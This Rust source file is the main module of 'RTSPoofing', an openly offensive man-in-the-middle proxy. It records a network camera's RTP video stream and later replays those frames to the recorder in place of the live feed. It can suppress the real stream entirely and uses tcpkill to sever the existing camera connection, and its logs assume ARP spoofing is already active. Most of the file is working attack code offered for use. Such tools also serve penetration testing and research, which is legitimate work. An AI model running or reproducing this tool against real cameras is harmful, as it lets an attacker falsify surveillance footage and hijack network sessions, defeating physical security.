//! RTSPoofing — RTSP/TCP MITM proxy with RTP frame injection.
//!
//! Rust reimplementation of RTSPoofing.py using Tokio async I/O.
//!
//! Usage:
//!   rtspoofing --mode record --camera-host 192.168.1.64 --capture-file out.rtp
//!   rtspoofing --mode inject --camera-host 192.168.1.64 --capture-file out.rtp --inject-only

mod capture;
mod parser;
mod proxy;
mod rtcp;
mod rtp_probe;

use std::path::PathBuf;
use std::sync::Arc;
use std::time::Duration;

use anyhow::Result;
use clap::{Parser, ValueEnum};
use tokio::net::TcpListener;
use tracing::{error, info};
use tracing_subscriber::EnvFilter;

use capture::read_capture_file;
use proxy::{MITMSession, Mode, ProxyConfig};

// ─────────────────────────────────────────────────────────────────────────────
// CLI
// ─────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, ValueEnum)]
enum CliMode { Record, Inject }

#[derive(Debug, Clone, ValueEnum)]
enum LogLevel { Trace, Debug, Info, Warn, Error }

#[derive(Debug, Parser)]
#[command(
    name    = "rtspoofing",
    about   = "RTSP/TCP MITM proxy — record and inject interleaved RTP frames.",
    version,
)]
struct Cli {
    /// Operating mode
    #[arg(long, value_enum)]
    mode: CliMode,

    /// IP to listen on
    #[arg(long, default_value = "0.0.0.0")]
    bind: String,

    /// TCP port to listen on
    #[arg(long, default_value_t = 554)]
    listen_port: u16,

    /// Camera IP / hostname
    #[arg(long)]
    camera_host: String,

    /// Camera RTSP port
    #[arg(long, default_value_t = 554)]
    camera_port: u16,

    /// Binary capture file path (.rtp)
    #[arg(long, default_value = "captured.rtp")]
    capture_file: PathBuf,

    /// Stop capturing after N frames (0 = unlimited)
    #[arg(long, default_value_t = 0)]
    capture_frames: usize,

    /// Seconds to wait before starting injection (warm-up)
    #[arg(long, default_value_t = 3.0)]
    inject_delay: f64,

    /// Target injection frame-rate
    #[arg(long, default_value_t = 25.0)]
    inject_fps: f64,

    /// Override SSRC in injected frames (e.g. 0xdeadbeef)
    #[arg(long, value_parser = parse_hex_or_dec)]
    inject_ssrc: Option<u32>,

    /// Suppress real camera stream; send only injected frames downstream
    #[arg(long, default_value_t = false)]
    inject_only: bool,

    /// Seconds between synthetic RTCP Sender Reports for the injected stream
    /// (0 disables RTCP SR generation; the RTP-level replay still works either way)
    #[arg(long, default_value_t = 5.0)]
    rtcp_sr_interval: f64,

    /// Interface to kill existing RTSP connection (e.g. eth0)
    #[arg(long)]
    tcpkill_iface: Option<String>,

    /// Seconds to wait after first connection before tcpkill fires
    #[arg(long, default_value_t = 2.0)]
    tcpkill_delay: f64,

    /// Log verbosity
    #[arg(long, default_value = "info")]
    log_level: String,
}

fn parse_hex_or_dec(s: &str) -> std::result::Result<u32, String> {
    if let Some(hex) = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")) {
        u32::from_str_radix(hex, 16).map_err(|e| e.to_string())
    } else {
        s.parse::<u32>().map_err(|e| e.to_string())
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// tcpkill
// ─────────────────────────────────────────────────────────────────────────────

async fn tcpkill_session(camera_host: &str, camera_port: u16, iface: &str, delay: Duration) {
    tokio::time::sleep(delay).await;

    let filter = format!("host {} and port {}", camera_host, camera_port);
    info!("tcpkill → killing existing session: {}", filter);

    // Verify traffic is visible first
    if let Ok(check) = tokio::process::Command::new("tcpdump")
        .args(["-i", iface, "-c", "3", "--immediate-mode", &filter])
        .output()
        .await
    {
        if !check.status.success() {
            error!("tcpkill → no traffic detected on {}. Is ARP spoof active?", iface);
        }
    }

    match tokio::process::Command::new("tcpkill")
        .args(["-9", "-i", iface, &filter])
        .spawn()
    {
        Err(e) => error!("tcpkill not found or failed: {}. Install with: apt install dsniff", e),
        Ok(mut child) => {
            tokio::time::sleep(Duration::from_secs(3)).await;
            let _ = child.kill().await;
            info!("tcpkill → done, waiting for NVR to reconnect...");
            tokio::time::sleep(Duration::from_secs(1)).await;
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Main
// ─────────────────────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() -> Result<()> {
    let cli = Cli::parse();

    // Logging
    tracing_subscriber::fmt()
        .with_env_filter(
            EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| EnvFilter::new(&cli.log_level)),
        )
        .with_target(false)
        .init();

    let mode = match cli.mode {
        CliMode::Record => Mode::Record,
        CliMode::Inject => Mode::Inject,
    };

    // Pre-load inject frames if needed
    let inject_frames = if mode == Mode::Inject {
        let (frames, params) = read_capture_file(&cli.capture_file)?;
        if frames.is_empty() {
            error!("No frames loaded from capture file.");
            std::process::exit(1);
        }

        // Apply auto-detected params as defaults (CLI overrides win)
        let _fps  = cli.inject_fps;   // could also take params.fps if cli default
        let _ssrc = cli.inject_ssrc.or(Some(params.ssrc));
        info!("Auto-detected from capture: PT={} SSRC=0x{:08X} FPS={:.1} Codec={}",
              params.pt, params.ssrc, params.fps, params.codec_name);
        Arc::new(frames)
    } else {
        Arc::new(vec![])
    };

    let cfg = Arc::new(ProxyConfig {
        mode:           mode.clone(),
        camera_host:    cli.camera_host.clone(),
        camera_port:    cli.camera_port,
        capture_file:   cli.capture_file.clone(),
        capture_frames: cli.capture_frames,
        inject_delay:   Duration::from_secs_f64(cli.inject_delay),
        inject_fps:     cli.inject_fps,
        inject_ssrc:    cli.inject_ssrc,
        inject_only:    cli.inject_only,
        rtcp_sr_interval: Duration::from_secs_f64(cli.rtcp_sr_interval.max(0.0)),
    });

    // Bind listener
    let addr = format!("{}:{}", cli.bind, cli.listen_port);
    let listener = TcpListener::bind(&addr).await?;
    info!(
        "RTSPoofing listening on {} — forwarding to {}:{}  [mode={:?}]",
        addr, cli.camera_host, cli.camera_port, mode
    );

    // Launch tcpkill in background if requested
    if let Some(iface) = cli.tcpkill_iface.clone() {
        let host  = cli.camera_host.clone();
        let port  = cli.camera_port;
        let delay = Duration::from_secs_f64(cli.tcpkill_delay);
        tokio::spawn(async move {
            tcpkill_session(&host, port, &iface, delay).await;
        });
    }

    // Accept loop
    let mut session_n: u32 = 0;
    loop {
        match listener.accept().await {
            Err(e) => { error!("Accept error: {}", e); continue; }
            Ok((stream, addr)) => {
                session_n += 1;
                info!("New connection from {} (session #{})", addr, session_n);

                let session = MITMSession::new(cfg.clone(), inject_frames.clone());
                tokio::spawn(async move {
                    if let Err(e) = session.run(stream).await {
                        error!("Session error: {}", e);
                    }
                });
            }
        }
    }
}
